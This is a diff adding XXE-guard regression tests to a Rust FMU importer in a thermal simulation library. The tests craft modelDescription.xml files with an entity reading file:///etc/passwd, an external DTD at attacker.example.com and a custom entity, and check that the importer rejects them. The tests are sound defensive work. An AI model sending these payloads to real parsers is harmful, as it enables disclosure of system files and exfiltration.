@@ -14,12 +14,15 @@
 //!    driven with the same weather within 0.1 % (acceptance criterion #2).
 
 use fluxion::interop::fmi::{
-    import_fmu, FmiConfig, FmiExporter, FmiImporter, FmuCoSimulationMaster, FmuInputs,
+    import_fmu, FmiConfig, FmiError, FmiExporter, FmiImporter, FmuCoSimulationMaster, FmuInputs,
     ZoneVariables,
 };
 use fluxion::physics::cta::VectorField;
 use fluxion::sim::engine::ThermalModel;
+use std::io::Write;
 use std::path::Path;
+use zip::write::SimpleFileOptions;
+use zip::CompressionMethod;
 
 /// Synthesize a simple 24-step "cold day" weather trace (Kelvin).
 fn cold_day_weather() -> Vec<f64> {
@@ -153,4 +156,141 @@ fn do_step_advances_time_and_reports_outputs() {
 fn import_rejects_nonexistent_path() {
     let res = import_fmu(Path::new("/no/such/missing.fmu"));
     assert!(res.is_err());
+}
+
+/// Write a single-entry `.fmu`-shaped ZIP archive with the given
+/// `modelDescription.xml` payload.
+///
+/// Used by the XXE-guard regression tests (issue #3591): we craft a
+/// malicious XML document, wrap it in the same archive layout the
+/// importer expects, and verify the importer refuses with
+/// `FmiError::ImportFailed` rather than resolving the external entity.
+fn write_fmu_with_xml(path: &Path, xml: &str) {
+    let file = std::fs::File::create(path).expect("create fmu");
+    let mut zip = zip::ZipWriter::new(file);
+    let options = SimpleFileOptions::default()
+        .compression_method(CompressionMethod::Deflated)
+        .unix_permissions(0o644);
+    zip.start_file("modelDescription.xml", options)
+        .expect("start modelDescription.xml");
+    zip.write_all(xml.as_bytes())
+        .expect("write modelDescription.xml");
+    zip.finish().expect("finish zip");
+}
+
+/// Minimal-but-valid `modelDescription.xml` body — used to wrap
+/// malicious prologues so the XML is otherwise well-formed enough
+/// to reach our DTD/interpreter checks instead of failing earlier
+/// on structural validation.
+fn benign_model_description_body() -> &'static str {
+    r#"<fmiModelDescription fmiVersion="2.0" modelName="XxeProbe" guid="{00000000-0000-0000-0000-000000000000}">
+  <CoSimulation modelIdentifier="xxe_probe" needsExecutionTool="true"/>
+  <DefaultExperiment startTime="0" stopTime="3600" stepSize="3600"/>
+  <ModelVariables>
+    <ScalarVariable name="zone_temperature" valueReference="1" causality="output" variability="continuous">
+      <Real unit="K" start="293.15"/>
+    </ScalarVariable>
+  </ModelVariables>
+</fmiModelDescription>"#
+}
+
+/// Regression test for issue #3591: a `.fmu` containing a
+/// `<!DOCTYPE … [<!ENTITY x SYSTEM "file:///etc/passwd">]>` DOCTYPE
+/// must be rejected by `FmiImporter::import` with `FmiError::ImportFailed`,
+/// never silently resolving the `SYSTEM` reference.
+#[test]
+fn import_rejects_xxe_entity_system_reference() {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let out = tmp.path().join("entity_resolver_test.fmu");
+    let xml = format!(
+        r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+{body}"#,
+        body = benign_model_description_body(),
+    );
+    write_fmu_with_xml(&out, &xml);
+
+    let res = FmiImporter::new().import(&out);
+    match res {
+        Err(FmiError::ImportFailed(msg)) => {
+            assert!(
+                msg.contains("XXE guard") || msg.contains("3591"),
+                "expected XXE-guard message, got: {msg}"
+            );
+        }
+        Err(other) => panic!("expected FmiError::ImportFailed, got: {other:?}"),
+        Ok(_) => panic!("expected FmiError::ImportFailed, got Ok(ImportedFmu)"),
+    }
+}
+
+/// Regression test for issue #3591: a `.fmu` containing a bare
+/// `<!DOCTYPE foo SYSTEM "…">` declaration (external DTD subset)
+/// must be rejected even when there is no internal subset.
+#[test]
+fn import_rejects_xxe_external_doctype() {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let out = tmp.path().join("external_doctype.fmu");
+    let xml = format!(
+        r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE fmiModelDescription SYSTEM "http://attacker.example.com/evil.dtd">
+{body}"#,
+        body = benign_model_description_body(),
+    );
+    write_fmu_with_xml(&out, &xml);
+
+    let res = FmiImporter::new().import(&out);
+    assert!(
+        matches!(res, Err(FmiError::ImportFailed(_))),
+        "external DOCTYPE SYSTEM reference must be rejected, got: {res:?}"
+    );
+}
+
+/// Regression test for issue #3591: a `.fmu` whose
+/// `modelDescription.xml` contains a `&x;` general entity reference
+/// (which would have come from an attacker-controlled DTD) must be
+/// rejected even if the DTD that declared it slipped past another
+/// check — defense-in-depth.
+#[test]
+fn import_rejects_xxe_general_entity_reference() {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let out = tmp.path().join("general_ref.fmu");
+    let xml = r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE fmiModelDescription [<!ENTITY x "leaked">]>
+<fmiModelDescription fmiVersion="2.0" modelName="GenRefProbe" guid="{{00000000-0000-0000-0000-000000000000}}">
+  <CoSimulation modelIdentifier="genref_probe" needsExecutionTool="true"/>
+  <DefaultExperiment startTime="0" stopTime="3600" stepSize="3600"/>
+  <ModelVariables>
+    <ScalarVariable name="zone_temperature" valueReference="1" causality="output" variability="continuous">
+      <Real unit="K" start="&x;"/>
+    </ScalarVariable>
+  </ModelVariables>
+</fmiModelDescription>"#;
+    write_fmu_with_xml(&out, xml);
+
+    let res = FmiImporter::new().import(&out);
+    assert!(
+        matches!(res, Err(FmiError::ImportFailed(_))),
+        "custom general entity &x; reference must be rejected, got: {res:?}"
+    );
+}
+
+/// Sanity check: legitimate `modelDescription.xml` documents with no
+/// DTD and no entity references continue to import successfully after
+/// the XXE guard was added (issue #3591).
+#[test]
+fn import_still_accepts_dtd_less_model_description() {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let out = tmp.path().join("dtd_less.fmu");
+    let xml = format!(
+        r#"<?xml version="1.0" encoding="UTF-8"?>
+{body}"#,
+        body = benign_model_description_body(),
+    );
+    write_fmu_with_xml(&out, &xml);
+
+    let res = FmiImporter::new().import(&out);
+    assert!(
+        res.is_ok(),
+        "benign DTD-less modelDescription.xml must still import, got: {res:?}"
+    );
 }
